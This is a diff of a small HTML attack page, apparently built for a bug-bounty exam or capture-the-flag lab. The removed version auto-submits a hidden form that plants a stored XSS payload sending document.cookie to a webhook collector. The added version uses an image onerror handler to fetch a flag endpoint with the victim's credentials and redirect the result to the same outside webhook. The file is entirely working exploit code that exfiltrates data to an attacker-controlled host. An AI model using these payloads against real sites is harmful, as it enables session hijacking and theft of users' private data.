@@ -1,16 +1,9 @@
 <html>
   <body>
-    <form action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST">
-      <input type="hidden" name="name" value="attacker">
-      <input type="hidden" name="email" value="attacker@test.com">
-      <input type="hidden" name="subject" value="XSS">
-      <input type="hidden" name="message" value="<img src=x onerror=fetch('https://webhooksite.net/74366b2e-d67d-466f-b06d-f011d3d7d349?c='+document.cookie)>">
-      <input type="hidden" name="category" value="general">
-      <input type="hidden" name="priority" value="high">
-    </form>
-
-    <script>
-      document.forms[0].submit();
-    </script>
+    <img src="x" onerror="
+      fetch('https://api-bugbounty-exam.hashacademy.co/api/flag', {credentials:'include'})
+      .then(r=>r.text())
+      .then(d=>location='https://webhooksite.net/74366b2e-d67d-466f-b06d-f011d3d7d349?flag='+encodeURIComponent(d))
+    ">
   </body>
 </html>
